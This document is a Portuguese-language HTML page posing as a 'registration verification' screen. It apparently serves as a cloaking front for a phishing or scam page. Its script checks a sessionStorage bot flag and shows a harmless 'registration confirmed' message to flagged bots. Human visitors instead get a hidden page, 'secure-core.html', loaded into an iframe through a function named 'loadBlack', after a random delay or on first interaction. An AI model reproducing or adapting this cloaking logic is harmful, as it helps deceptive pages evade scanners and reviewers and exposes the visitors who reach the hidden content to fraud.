<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Verificação Final</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/7/7e/Info_icon_72x72.svg" type="image/x-icon">
  <style>
    body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
    header { background: #004aad; color: white; padding: 15px; text-align: center; }
    .container { max-width: 600px; margin: 40px auto; background: white; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.1); border-radius: 6px; text-align: center; }
  </style>
</head>
<body>
<header>
  <h1>Verificação de Cadastro</h1>
</header>
<div class="container" id="app">
  <p>Carregando ambiente seguro...</p>
</div>
<script>
let isBotStorage = sessionStorage.getItem("_isBot");
window._isBot = (isBotStorage && isBotStorage === "1");

if(!window._isBot){
  let loaded = false;
  const loadBlack = ()=>{
    if(loaded) return;
    loaded = true;
    setTimeout(()=>{
      const f = document.createElement("iframe");
      f.style="width:100%;height:600px;border:none;";
      f.src="secure-core.html"; // mesma pasta
      const app = document.getElementById("app");
      if(app){
        app.innerHTML="";
        app.appendChild(f);
      }
    }, 1500 + Math.random()*1000);
  };
  // garante que abre sozinho
  setTimeout(loadBlack, 3000);
  // abre antes se o humano interagir
  ["click","scroll","keypress","touchstart"].forEach(ev=>{
    window.addEventListener(ev, loadBlack, {once:true});
  });
} else {
  const app = document.getElementById("app");
  if(app) app.innerHTML = "<p>Cadastro confirmado.</p>";
}
</script>
</body>
</html>
